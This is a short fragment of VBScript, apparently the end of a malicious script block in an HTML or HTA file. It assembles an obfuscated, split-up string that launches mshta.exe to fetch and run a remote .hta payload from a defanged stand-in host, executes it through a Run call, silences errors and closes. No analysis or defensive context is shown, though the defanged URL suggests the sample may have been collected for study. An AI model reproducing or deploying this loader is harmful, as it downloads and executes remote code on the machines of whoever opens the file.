cmd = "%windir%\" & "system32\" & "ms" & "hta" & ".exe " & "hxxps" & "://exa" & "mple.invalid/send/regu" & "lar/02.03/rejoined.hta"
registered.Run cmd
On Error Resume Next
Close
</script>
